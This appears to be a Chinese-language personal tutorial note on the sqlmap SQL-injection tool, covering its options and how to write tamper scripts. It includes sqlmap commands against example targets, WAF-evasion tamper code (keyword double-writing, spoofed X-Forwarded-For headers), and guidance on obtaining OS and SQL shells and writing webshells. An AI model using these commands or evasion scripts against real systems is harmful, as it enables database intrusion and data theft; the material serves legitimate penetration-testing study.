---
title: "SQLMAP使用"
outline: deep
tags: "Note"
updateTime: "2026-3-3 17:44"
---

# SQLMAP 

## 0x 01 简介

```
SQLMAP是一种开源渗透测试工具，可自动检测和利用SQL注入缺陷并接管数据库服务器的过程。它具有功能强大的检测引擎，最终渗透测试仪的许多利基特征以及包括数据库指纹的广泛开关，从数据库中获取数据，访问基础文件系统以及通过频段连接在操作系统上执行命令。
```

官网地址：https://sqlmap.org/

官方Wiki：https://github.com/sqlmapproject/sqlmap/wiki

## 0x 02 使用

#### 1.输出详细日志 `-v`

日志输出有七个等级，默认的日志输出等级为1

```
0: 只显示Python追溯，错误和关键消息。
1: 还显示信息和警告消息。
2：还显示调试消息。
3：显示有效负载。
4：还显示HTTP请求。
5：还显示HTTP响应的标题。
6：还显示HTTP响应的页面内容。
```

可以使用`-vvv`的方式来指定等级为三，也可以使用`-v 3`的方式直接指定。

![image](assets/SQLMAP/image-20250511013740-3p7ot5p.png)

#### 2.直接连接数据库 `-d`

```
sqlmap -d "mysql://root:root@172.31.0.2:3306/ctf"
```

可以直接使用`-d`参数连接到远程数据库，利用sqlmap直接写入webshell等。

注：本地没有开启ssl，所以连接失败了。

![image](assets/SQLMAP/image-20250511130347-z9djmbg.png)

#### 3.批量扫描 `-m`

编辑文件

```
www.target1.com/vuln1.php?q=foobar
www.target2.com/vuln2.asp?id=1
www.target3.com/vuln3/id/1*
```

使用参数`-m`进行批量扫描文件。

#### 4.从文件加载HTTP请求 `-r`

SQLMAP的可能性之一是从文本文件加载原始的HTTP请求。这样可以许多其他选项（例如，cookie的设置，POST的数据等）。

```
POST /vuln.php HTTP/1.1
Host: www.target.com
User-Agent: Mozilla/4.0

id=*
```

打`*`号的地方会被认作是注入点

#### 5.HTTP用户代理标头

默认情况下SQLMAP使用的`User-Agent`是：

```
sqlmap/1.0-dev-xxxxxxx (http://sqlmap.org)
```

可以指定	`--user-agent`来设置指定的`User-Agent`或者`--random-agent`使用随机的`User-Agent`

#### 6.绕过反CSRF保护 `--csrf-token` `--csrf-url`

```
许多站点都以令牌形式包含反CSRF保护，在每个页面响应中随机设置的隐藏字段值。 SQLMAP将自动尝试识别并绕过这种保护，但是可以使用一些选项-CSRF-Toke和-CSRF-url可以用来进一步微调它。选项-CSRF-Token可用于设置包含随机令牌的隐藏值的名称。在网站使用此类字段的非标准名称时，这很有用。选项-CSRF-url可用于从任意URL地址检索令牌值。如果易受攻击的目标URL首先不包含必要的令牌值，但是需要从其他位置提取它，这很有用。
```

#### 7.SSL/HTTPS的强制使用 `--force-ssl`

如果用户想强制使用SSL/HTTPS请求来实现目标，他可以使用此开关。在通过使用选项 -  crawl或在提供带有选项-L的Burp日志时收集URL的情况下，这可能很有用。

#### 8.在每个请求期间评估自定义Python代码 `--eval`

如果用户想更改（或添加新的）参数值，这很可能是由于某些已知依赖性，他可以将带有选项的自定义Python代码提供给SQLMAP，该代码将在每个请求之前进行评估。

```
$ python sqlmap.py -u "http://www.target.com/vuln.php?id=1&hash=c4ca4238a0b9238\
20dcc509a6f75849b" --eval="import hashlib;hash=hashlib.md5(id).hexdigest()"
```

#### 9.手动指定DBMS `--dbms`

默认情况下，SQLMAP自动检测Web应用程序的后端数据库管理系统。如果在已知目标DBMS的情况下，可以手动指定。

#### 10.自定义注入有效载荷 `--prefix` and `--suffix`

手动指定payload的前缀后跟后缀，这在构造一些奇怪的SQL注入常见非常有用。

例如：

```sql
$query = "SELECT * FROM users WHERE id=('" . $_GET['id'] . "') LIMIT 0, 1";
```

像上面的SQL语句，我们可以指定`--prefix`前缀为`')`，`--suffix`后缀为`"AND ('abc'='abc"`

```
sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_str_brackets.php\
?id=1" -p id --prefix "')" --suffix "AND ('abc'='abc"
```

拼接后，等效于

```
$query = "SELECT * FROM users WHERE id=('1') <PAYLOAD> AND ('abc'='abc') LIMIT 0, 1";
```

#### 11.篡改注入数据 `--tamper`

```
tamper脚本主要用于绕过 WAF（Web 应用防火墙）、IDS/IPS（入侵检测/防御系统）和输入过滤机制，常见于 SQL 注入测试工具（如 sqlmap）的 Tamper 脚本集合。每个脚本对应不同的绕过场景和防护机制，实际使用需根据目标环境选择。
```

修改脚本的格式为：

```python
# Needed imports
from lib.core.enums import PRIORITY

# Define which is the order of application of tamper scripts against
# the payload
__priority__ = PRIORITY.NORMAL

def tamper(payload):
    '''
    Description of your tamper script
    '''

    retVal = payload

    # your code to tamper the original payload

    # return the tampered payload
    return retVal
```

当然SQLMap已经提供了不少的tamper脚本，在其根目录下的`/tamper`目录下

```
0eunion.py            # 将 UNION 替换为 0eUNION（利用科学计数法绕过检测）
apostrophemask.py     # 将单引号替换为 Unicode 字符 %EF%BC%87 进行混淆
apostrophenullencode.py # 将单引号替换为空字符编码 %00%27
appendnullbyte.py     # 在有效载荷末尾添加空字节 %00（绕过字符串截断）
base64encode.py       # 使用 Base64 编码整个请求
between.py            # 用 BETWEEN 替换 > 符号
binary.py             # 使用二进制字符串比较方式绕过
bluecoat.py           # 针对 Blue Coat 设备的特殊空格替换（09 -> %0B）
chardoubleencode.py   # 对有效载荷进行双重 URL 编码
charencode.py         # 使用 URL 编码随机编码字符
charunicodeencode.py  # 使用 Unicode 编码字符串
charunicodeescape.py  # 使用 Unicode 转义格式编码字符
commalesslimit.py     # 使用 OFFSET 替代 LIMIT 语句中的逗号
commalessmid.py       # 使用 FROM 和 FOR 替代 MID 语句中的逗号
commentbeforeparentheses.py # 在括号前添加注释混淆
concat2concatws.py    # 将 CONCAT() 替换为 CONCAT_WS()
decentities.py        # 使用十进制 HTML 实体编码字符
dunion.py             # 在 UNION 前添加脏字符（如 DISTINCT）
equaltolike.py        # 将 = 替换为 LIKE 运算符
equaltorlike.py       # 将 = 替换为 RLIKE 运算符（正则匹配）
escapequotes.py       # 对引号进行反斜杠转义
greatest.py           # 用 GREATEST 函数替代 > 比较符
halfversionedmorekeywords.py # 在关键字前添加注释和版本号（/*!0UNION*/）
hex2char.py           # 使用 CHAR() 函数替代十六进制值
hexentities.py        # 使用十六进制 HTML 实体编码字符
htmlencode.py         # 使用 HTML 实体编码字符
if2case.py            # 用 CASE WHEN 语句替代 IF() 函数
ifnull2casewhenisnull.py # 用 CASE WHEN IS NULL 替代 IFNULL()
ifnull2ifisnull.py    # 用 IF(ISNULL()) 替代 IFNULL()
informationschemacomment.py # 在 information_schema 后添加注释
least.py              # 用 LEAST 函数替代 > 比较符
lowercase.py          # 将所有关键字转换为小写
luanginxmore.py       # 针对 Lua/Nginx 的扩展绕过技术
luanginx.py           # 针对 Lua/Nginx 的绕过技术
misunion.py           # 在 UNION 后添加脏字符（如 ALL SELECT）
modsecurityversioned.py # 添加版本号注释绕过 ModSecurity
modsecurityzeroversioned.py # 添加零版本号注释绕过 ModSecurity
multiplespaces.py     # 在关键字中添加多个空格
ord2ascii.py          # 用 ASCII() 替代 ORD()
overlongutf8more.py   # 使用超长 UTF-8 编码（扩展版）
overlongutf8.py       # 使用超长 UTF-8 编码
percentage.py         # 在每个字符前添加百分号
plus2concat.py        # 用 CONCAT() 替代加号连接符
plus2fnconcat.py      # 用函数嵌套的 CONCAT() 替代加号
randomcase.py         # 随机大小写混淆关键字
randomcomments.py     # 在关键字中随机插入注释
schemasplit.py        # 将 schema.tablename 拆分为表达式
scientific.py         # 使用科学计数法表示数字
sleep2getlock.py      # 用 GET_LOCK() 替代 SLEEP()
space2comment.py      # 用 /**/ 替代空格
space2dash.py         # 用 -- 加随机字符替代空格
space2hash.py         # 用 %23 加换行符替代空格
space2morecomment.py  # 用 /**_**/ 替代空格
space2morehash.py     # 用多个%23和换行符替代空格
space2mssqlblank.py   # 用 MSSQL 支持的空白符替代空格
space2mssqlhash.py    # 用 %23 加换行符替代空格（MSSQL专用）
space2mysqlblank.py   # 用 MySQL 支持的空白符替代空格
space2mysqldash.py    # 用 --%0A 替代空格（MySQL专用）
space2plus.py         # 用 + 替代空格
space2randomblank.py  # 用随机空白符替代空格
sp_password.py        # 在语句末尾添加 sp_password 混淆（MSSQL）
substring2leftright.py # 用 LEFT/RIGHT 替代 SUBSTRING
symboliclogical.py    # 用符号逻辑运算符（如 &&）替代关键字
unionalltounion.py    # 将 UNION ALL 转换为 UNION
unmagicquotes.py      # 用 %bf%27 绕过 magic_quotes
uppercase.py          # 将所有字符转换为大写
varnish.py            # 添加 X-Forwarded-For 头绕过 Varnish
versionedkeywords.py  # 在关键字前添加版本号注释
versionedmorekeywords.py # 在多个关键字前添加版本号注释
xforwardedfor.py      # 添加伪造的 X-Forwarded-For 头
```

#### 12.选择级别 `--level`

SQLMAP有五个级别。默认值是1执行有限数量的测试级别。此选项不仅会影响哪些有效载荷SQLMAP尝试，而且还会在考试中进行哪些注入点：GET和POST参数始终测试，HTTP Cookie头值是从2级和HTTP用户代理/推荐人标头的值测试的HTTP cookie头值。

#### 13.选择风险级别 `--risk`

此选项需要一个参数，该参数指定要执行测试的风险。有三个风险值。默认值为1，对于大多数SQL注入点是无害的。风险值2增加了默认级别的重量基于时间基于时间的SQL注射和值3的测试也增加了或基于基于SQL注入测试。

#### 14.指定注入类型 `--technique`

此选项可用于指定要测试的SQL注入类型。默认情况下，它支持的所有类型/技术的SQLMAP测试。

在某些情况下，您可能只想测试一种或几种特定类型的SQL注入思想，这就是此选项发挥作用的地方。

此选项需要一个参数。这种论点是由B，E，U，S，T和Q字符组成的字符串，每个字母都代表着不同的技术：

```
B: Boolean-based blind
E: Error-based
U: Union query-based
S: Stacked queries
T: Time-based blind
Q: Inline queries
```

时间注入可以使用`--time-sec`选项指定延迟的时间。

#### 15.二次注入 `--second-url` and `--second-req`

二阶SQL注入攻击是一种攻击，在一个易受攻击的页面中，在另一个脆弱的页面中（例如，反映）（例如）显示了一个攻击（s）。通常，由于数据库存储的用户存储在原始脆弱页面上提供了输入。

可以通过使用选项 - 与url地址或 - 秒req一起使用请求文件，以发送到显示结果的情况下，使用选项 `--second-order`或 - `--second-req`来测试SQLMAP来测试这种类型的SQL注入。

参考靶机((20260125235304-7sh3z5d "motto"))

#### 16.忽略状态码继续测试`–ignore-code=xxx`

忽略状态码500继续进行测试，常见触发SQL报错可能出现500状态码，或者未查找到执行结果接口可能出现404状态码，可指定`–ignore-code=xxx`进行测试

#### 17.忽略重定向`--ignore-redirects`

如果目标网站添加了URI或者是Location等头部，SQLMAP可能会让你选择yes或者no，测试起来相对麻烦，可以直接添加`--ignore-redirects`直接忽视重定向。

#### 18.清除会话`--flush-session`

SQLMAP在成功获得注入点后会保存Session，通常路径是以下几个：

```
~/.local/share/sqlmap/output/
~/.sqlmap/output/
/usr/share/sqlmap/output
```

![image](assets/SQLMAP/image-20251010093936-dlcle36.png)

但是一些特殊情况或者是目标环境改变了，我们需要重新清除会话后执行其他指令进行注入，可以添加参数`--flush-session`。

![image](assets/SQLMAP/image-20251010094626-u0kashf.png)

#### 19.设置代理`--proxy=http://127.0.0.1:65532`

为了确认HTTP流量请求或者进一步探测SQLMAP是如何利用漏洞进行攻击的，我们可以设置代理来联动BurpSuite或Yakit等抓包工具进一步探测流量。

#### 20.获取shell`--sql-shell`或`--os-shell`

在SQLMAP成功获得注入点后，可直接使用`--sql-shell`参数来获得一个可交互式的SQL SHELL，此SHELL只能执行SQL语句，基于注入点不同，可能还有某些SQL语法无法执行，这需要进一步判断。`--os-shell`，在获得MSSQL等数据库存在可以命令执行函数的数据库上，可以使用此指令，SQLMAP会自动探测利用方式，包括但不限于上传webshell，开启数据库自带的系统执行函数等方式。

#### 21.SQLMAP指定请求间隔时间`--delay=SECONDS`

在某些特定情况下，测试WAF拦截请求的速率，默认SQLMAP请求不会延迟，指定参数`--delay=0.5`，每次请求发包间隔0.5秒。

## 0x 03 Tamper脚本编写

如何编写自己的Tamper脚本，创建一个`my.py`并保存在`sqlmap\tamper`路径下，在使用sqlmap时，使用`--tamper=my`指定即可。

这里先拿一个官方的Tamper脚本进行解释说明，

`xforwardedfor.py`

```python
#!/usr/bin/env python

"""
Copyright (c) 2006-2025 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import random

from lib.core.compat import xrange
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def randomIP():
    octets = []

    while not octets or octets[0] in (10, 172, 192):
        octets = random.sample(xrange(1, 255), 4)

    return '.'.join(str(_) for _ in octets)

def tamper(payload, **kwargs):
    """
    Append a fake HTTP header 'X-Forwarded-For' (and alike)
    """

    headers = kwargs.get("headers", {})
    headers["X-Forwarded-For"] = randomIP()
    headers["X-Client-Ip"] = randomIP()
    headers["X-Real-Ip"] = randomIP()
    headers["CF-Connecting-IP"] = randomIP()
    headers["True-Client-IP"] = randomIP()

    # Reference: https://developer.chrome.com/multidevice/data-compression-for-isps#proxy-connection
    headers["Via"] = "1.1 Chrome-Compression-Proxy"

    # Reference: https://wordpress.org/support/topic/blocked-country-gaining-access-via-cloudflare/#post-9812007
    headers["CF-IPCountry"] = random.sample(('GB', 'US', 'FR', 'AU', 'CA', 'NZ', 'BE', 'DK', 'FI', 'IE', 'AT', 'IT', 'LU', 'NL', 'NO', 'PT', 'SE', 'ES', 'CH'), 1)[0]

    return payload

```

### 1.Import部分

这一部分我们可以导入sqlmap的内部库，sqlmap为我们提供了很多封装好的函数和数据类型，比如下文的`PRIORITY`就来源于`sqlmap/lib/core/enums.py`

### 2.PRIORITY属性

PRIORITY是定义tamper的优先级，PRIORITY有以下几个参数:

- LOWEST \= -100
- LOWER \= -50
- LOW \= -10
- NORMAL \= 0
- HIGH \= 10
- HIGHER \= 50
- HIGHEST \= 100

如果使用者使用了多个tamper，sqlmap就会根据每个tamper定义PRIORITY的参数等级来优先使用等级较高的tamper，如果你有两个tamper需要同时用，需要注意这个问题。

注：在使用官方给定的Tamper也不是越多越好，往往需要根据数据库类型，WAF匹配等进行熟练使用，一味加tamper也很有可能会导致SQLMAP无法正常运行。

### 3.dependencies

dependencies主要是提示用户，这个tamper支持哪些数据库，具体参考如下：

```python
#!/usr/bin/env python

"""
Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

from lib.core.enums import PRIORITY
from lib.core.common import singleTimeWarnMessage
from lib.core.enums import DBMS

__priority__ = PRIORITY.NORMAL

def dependencies():
    singleTimeWarnMessage("这是我的tamper提示")

def tamper(payload, **kwargs):
    return payload
```

![image](assets/SQLMAP/image-20251010092718-xqrub9m.png)

DBMS.MYSQL这个参数代表的是Mysql，其他数据库的参数也可以看这个`\sqlmap\lib\core\enums.py`

![image](assets/SQLMAP/image-20251010092829-a7w8w1r.png)

### 4.Tamper函数

tamper这个函数是tamper最重要的函数，你要实现的功能，全部写在这个函数里。payload这个参数就是sqlmap的原始注入payload，我们要实现绕过，一般就是针对这个payload的修改。kwargs是针对http头部的修改，如果你bypass，是通过修改http头，就需要用到这个，详细看下面举例分析。

**修改payload**

在CTF或者WAF绕过中都会遇到对SQL关键字的正则匹配，我们需要进行关键字的替换，例如编写一个双写绕过：

```python
def tamper(payload, **kwargs):
    payload = payload.lower()
    payload = payload.replace('select','seleselectct')
    payload = payload.replace('union','ununionion')
    return payload
```

**修改HTTP请求头**

从`xforwardedfor.py`我们可以看出，`kwargs`参数可以获得`headers`，通过修改`headers`数组来修改HTTP头部，这样可以有效避免防火墙等拦截	

```python
def tamper(payload, **kwargs):
    """
    Append a fake HTTP header 'X-Forwarded-For' (and alike)
    """

    headers = kwargs.get("headers", {})
    headers["X-Forwarded-For"] = randomIP()
    headers["X-Client-Ip"] = randomIP()
    headers["X-Real-Ip"] = randomIP()
    headers["CF-Connecting-IP"] = randomIP()
    headers["True-Client-IP"] = randomIP()

    # Reference: https://developer.chrome.com/multidevice/data-compression-for-isps#proxy-connection
    headers["Via"] = "1.1 Chrome-Compression-Proxy"

    # Reference: https://wordpress.org/support/topic/blocked-country-gaining-access-via-cloudflare/#post-9812007
    headers["CF-IPCountry"] = random.sample(('GB', 'US', 'FR', 'AU', 'CA', 'NZ', 'BE', 'DK', 'FI', 'IE', 'AT', 'IT', 'LU', 'NL', 'NO', 'PT', 'SE', 'ES', 'CH'), 1)[0]

    return payload
```

## Ref

https://y4er.com/posts/sqlmap-tamper/

https://mp.weixin.qq.com/s/dJjMFnVPFfYUF7hWOVDscw